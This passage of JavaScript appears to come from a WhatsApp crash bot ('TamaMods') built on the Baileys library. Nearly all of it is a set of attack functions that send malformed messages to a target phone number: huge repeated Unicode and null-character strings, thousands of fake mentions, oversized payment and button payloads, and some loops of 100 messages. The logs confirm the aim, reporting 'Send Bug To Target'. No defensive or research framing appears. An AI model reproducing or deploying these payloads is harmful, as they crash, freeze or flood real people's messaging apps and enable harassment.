                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined }
                ]
              }
            ]
          }
        ]
      })

      if (mention) {
        await TamaMods.relayMessage(target, {
          groupStatusMentionMessage: {
            message: {
              protocolMessage: { key: msg.key, type: 25 }
            }
          }
        }, {
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍"
              }
            }
          ]
        })
      }

      console.log(chalk.green(`Success Send Bug🐉\nmessage : ${i + 1}/${lopix}\nnumber : ${target}`))
      if (i < 99) {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  } catch (err) {
    console.error(err)
  }
}

async function svlzVs(target) {
var msg = { url: "https://l.top4top.io/p_3552yqrjh1.jpg" }
  await TamaMods.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " #Tama Official ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 555,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: false,
              title: "Tama Official - \"����34\" ����",
              body: "https://rule34.com",
              previewType: "VIDEO",
              mediaType: "VIDEO",
              thumbnail: msg,
              sourceUrl: "t.me/TamaModss",
              mediaUrl: "t.me/TamaModss",
              sourceType: " x ",
              sourceId: " x ",
              containsAutoReply: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: msg,
              caption: " X ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X ",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X ",
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}
async function EpUi(TamaMods, target, ptcp) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: " #Tama-Modss\nt.me/TamaModss ",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(150000)
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: "ꦽ".repeat(900000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(800000)
              }
            ]
          }
        }
      }
    }
  }, {});

  await TamaMods.relayMessage(target, msg.message, ptcp ? { participant: { jid: target } } : {});
  console.log(chalk.green("Send Bug To Target🐉"));
}
const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "𝐒𝐲𝐨𝐧𝐱𝐙~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": " SyonxInVasion " + "ꦾ".repeat(103000),
        "body": {
            "text": "SyonxRyuchi" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "SYONXRYUCHI" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": false,
            "title": " #TamaModss. ",
            "body": "Tama Always With You",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://t.me/TamaModss",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "12036332170343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Syonx Crasher",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}
async function CrlButton(TamaMods, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: `\0` },
            carouselMessage: {
              cards: [
                {
                  header: {
                    ...(await prepareWAMessageMedia(
                      { image: { url: "https://files.catbox.moe/k5c6co.jpg" } },
                      { upload: TamaMods.waUploadToServer }
                    )),
                    title: `\0`,
                    gifPlayback: true,
                    subtitle: "\0",
                    hasMediaAttachment: true
                  },
                  body: {
                    text:
                      " #TamaModss. " + "ꦾ".repeat(120000)
                  },
                  footer: { text: "\0" },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "🦋 𝗧𝗮𝗺𝗮𝗠𝗼𝗱𝘀𝘀ܢ𝐎𝐯𝐞𝐫𝐅𝐥𝐨⃕𝐰⃟",
                          sections: []
                        })
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                      },
                      { name: "call_permission_request", buttonParamsJson: "{}" },
                      { name: "mpm", buttonParamsJson: "{}" },
                      {
                        name: "single_select",
                        buttonParamsJson:
                          "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson:
                          "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                      },
                      {
                        name: "cta_url",
                        buttonParamsJson:
                          "{\"display_text\":\"Developed\",\"url\":\"https://t.me/TamaModss\",\"merchant_url\":\"https://t.me/TamaModss\"}"
                      },
                      {
                        name: "cta_call",
                        buttonParamsJson:
                          "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                      },
                      {
                        name: "cta_copy",
                        buttonParamsJson:
                          "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                      },
                      {
                        name: "cta_reminder",
                        buttonParamsJson:
                          "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                      },
                      {
                        name: "cta_cancel_reminder",
                        buttonParamsJson:
                          "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                      },
                      {
                        name: "address_message",
                        buttonParamsJson:
                          "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                      },
                      { name: "send_location", buttonParamsJson: "\0" }
                    ]
                  }
                }
              ],
              messageVersion: 1
            }
          }
        }
      }
    },
    { quoted: VcardQuoted }
  );

  await TamaMods.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  console.log("Success! Crl Button Sent");
}
const GalaxyQ = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Tama Crasher",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };

async function Loc(target, jids) {
let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
 viewOnceMessage: {
  message: {
   interactiveMessage: {
     header: {
         title: "",
         locationMessage: {},
         hasMediaAttachment: true
      },
        body: {
        text: "𝑭𝒊𝒏𝒊𝒙 - 𝑫𝒆𝒔𝒕𝒆𝒓𝒖𝒊𝒅𝒐𝒓" + "ꦽ".repeat(10000) +  "ꦾ".repeat(73000)
      },
     nativeFlowMessage: {
      buttons: [
           {
           name: "single_select",
           buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
          },
          {
            name: "cta_url",
            buttonParamsJson: "ꦽ".repeat(55000),
          },
          {
           name: "cta_url",
           buttonParamsJson: JSON.stringify({
           display_text: "𝗧𝗮𝗺𝗮 - 𝗠𝗼𝗱𝘀",
           url: "http://wa.Me/stickerpack/TamaMods-Settings"
           }),
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "RIVIEW",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "DOCUMENT",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          }
         ],
        messageParamsJson: "{}".repeat(10000)
        }
       }
      },
      carouselMessage: {
      cards: []
      }
     }
  }), {
userJid: target,
quoted: GalaxyQ
}
);
     await TamaMods.relayMessage(target, msg.message, jids ? {
  participant: { jid: target }
  } : {});
}
async function bulldozer(TamaMods, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(target, message, {})

  await TamaMods.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  })
}
async function DocBlank(target, ptcp = true) {
  await TamaMods.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Xnxx.com",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "\u0000\n" + "ꦾ".repeat(60000),
            },
            nativeFlowMessage: {
                  messageParamsJson: "{".repeat(5000),
                },
            footer: {
              text: "\u0000\n" + "ꦾ".repeat(60000),
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Xnxx.com",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function AudioFlood(target) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/AbCdEsnith.mp4", gifPlayback: true }
  }, {
    upload: TamaMods.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "newsletter crash ~",
            serverMessageId: 1
          }
        },
        header: {
          title: "TamaModss",
          ...videoPayload,
          hasMediaAttachment: true
        },
        body: { text: "TamaModss" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"...".repeat(1000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + ".....".repeat(10),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: target })
    await TamaMods.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
}
async function NativeStcx(target, mention) {
  let msg1 = {
    interactiveMessage: {
      body: {
        text: "¿Finix Exc ꆜ" + "꧀".repeat(55000)
      },
      nativeFlowMessage: {
        buttons: [
        {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "RIVIEW",
              flow_cta: "\u0000".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: "\u0000".repeat(55000),
          },
          {
            name: "cta_url",
            buttonParamsJson: "\u0000".repeat(55000),
          }
        ]
      }
    }
  };
  
  const msg2 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Finix Exc", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(25000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: true, 
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: true,
      isLottie: true,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  for (const msg of [msg1, msg2, msg3]) {
    await TamaMods.relayMessage(
      "status@broadcast",
      msg.message || msg,
      {
        messageId: msg.key?.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      }
    );
  }

  if (mention) {
    await TamaMods.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Finix Exc" }, // Jangan Diubah
            content: undefined
          }
        ]
      }
    );
  }
}
async function DelayFreez(target) {
 let bug = "ꦽ".repeat(10000);
 let maklo = "ꦾ".repeat(73000);
  let image = { 
    url: "https://files.catbox.moe/o9qrzf.jpg" 
    }
   await TamaMods.sendMessage(target, {
    text: "TamaMods" + bug + maklo,
    mentions: target,
    contextInfo: {
      mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 555,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: false,
              title: "\u0000" + bug,
              body: "\u0000",
              previewType: "VIDEO",
              mediaType: "VIDEO",
              thumbnail: image,
              sourceUrl: "http://wa.me/stickerpack/TamaMods-Settings",
              mediaUrl: "http://wa.me/stickerpack/TamaMods-Settings",
              sourceType: " x ",
              sourceId: " x ",
              containsAutoReply: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: image,
              caption: " X ",
           },
         }
     }
  );
}
async function ForceInfinity(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "TamaModss" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await TamaMods.relayMessage(target, msg.message, {
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
      ],
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });

    await TamaMods.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("ForceLose Sending To Target");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
async function KyzuuHard(target) {  
    for (let i = 0; i < 100; i++) {
        try {
            let etc = await generateWAMessageFromContent(  
                target,  
                {  
                    viewOnceMessage: {  
                        message: {  
                            interactiveResponseMessage: {  
                                body: {  
                                    text: "DELAY BETA",  
                                    format: "DEFAULT"  
                                },  
                                nativeFlowResponseMessage: {  
                                    name: "call_permission_request",  
                                    paramsJson: "\u0000".repeat(1035000),  
                                    version: 3  
                                }  
                            }  
                        }  
                    }  
                },  
                {  
                    userJid: target,  
                    quoted: null  
                }  
            );  

            await TamaMods.relayMessage(target, etc.message, {
                participant: {
                    jid: target
                }
            });
        } catch (err) {
            console.error("Error autosync:", err);
        }
    }
};
async function force3(TamaMods, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/wbl5er.jpg" } },
    { upload: TamaMods.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: "TamaMods" + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await TamaMods.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}
async function force4(TamaMods, target) {
  try {
    let cards = [];

    for (let i = 0; i < 10; i++) {
      cards.push({
        header: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
            fileLength: "9999999999",
            height: 816,
            width: 654,
            mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
            fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
            directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1749220174",
            jpegThumbnail: null
          },
          hasMediaAttachment: true
        },
        body: {
          text: "TamaMods" + "ꦽ".repeat(30000)
        },
        nativeFlowMessage: {
          messageParamsJson: "{}", 
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(999999999999999)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
            {
              name: "payment_method",
              buttonParamsJson: "{}",
            },
            {
              name: "payment_info",
              buttonParamsJson: "{}"
            },
            {
              name: "payment_settings",
              buttonParamsJson: "{}"
            },
            {
              name: "review_and_pay",
              buttonParamsJson: "{}"          
            },
          ]
        }
      });
    }

    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [ target, ...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              },
              participant: target,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "TamaMods".repeat(1000),
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "\n".repeat(10000),
                        version: 3
                      }
                    }
                  }
                }
              }
            },
            body: {
              text: "ꦽ".repeat(30000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(50000)
            },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    };

    await TamaMods.relayMessage(target, message, {
      messageId: undefined,
      participant: { jid: target }
    });
  } catch (err) {
    console.log(err);
  }
}
async function blanknotif4(TamaMods, target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363418749199341@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "TamaMods" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝".repeat(20000),
      caption: "TamaMods" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝".repeat(20000),
      jpegThumbnail: null, 
    }, 
  };
  await TamaMods.relayMessage(target, msg, {
    participant: { jid: target }, 
    messageId: null, 
  });
}
async function applecrash1(target, mention) {
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: "TamaMods" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/TamaModss",
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "TamaMods" + s,
            matchedText: "",
